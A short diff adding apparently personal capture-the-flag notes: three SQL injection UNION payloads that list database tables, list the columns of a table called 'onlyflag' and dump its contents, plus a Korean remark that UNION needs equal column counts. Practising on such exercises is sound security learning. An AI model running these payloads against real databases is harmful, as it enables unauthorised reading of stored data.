@@ -1,0 +1,8 @@
+' union select table_name, null, null, null from information_schema.tables#
+
+' union select column_name, null, null, null from
+information_schema.columns where table_name='onlyflag' #
+
+' union select idx, sname, null, svalue from onlyflag #
+
+유니온은 칼럼의 갯수가 같아야 사용가능.
